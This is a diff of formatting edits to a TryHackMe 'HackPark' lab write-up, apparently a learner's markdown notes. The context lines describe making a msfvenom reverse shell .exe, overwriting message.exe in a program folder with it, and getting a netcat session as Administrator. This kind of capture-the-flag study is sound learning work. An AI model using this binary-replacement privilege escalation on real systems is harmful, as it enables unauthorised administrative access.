@@ -1,4 +1,4 @@
-Links: [[TryHackMe Boxes]]
+**Links: [[TryHackMe Boxes]]
 #Windows
 
 # HackPark
@@ -447,17 +447,17 @@ We create a reverse shell .exe using msfvenom and start a netcat listener
 We overwrite message.exe with our new .exe
 ```
 C:\PROGRA~2\SYSTEM~1>
-==copy "c:\windows\temp\shell.exe" message.exe==
+copy "c:\windows\temp\shell.exe" message.exe
 C:\PROGRA~2\SYSTEM~1>copy "c:\windows\temp\shell.exe" message.exe
 
 
 Overwrite message.exe? (Yes/No/All): 
-==yes==
+yes
 Overwrite message.exe? (Yes/No/All): yes
         1 file(s) copied.
 ```
 
-We gain access with our netcat session as ==Administrator==
+We gain access with our netcat session as "Administrator"
 ```
 C:\PROGRA~2\SYSTEM~1>echo %username%
 echo %username%
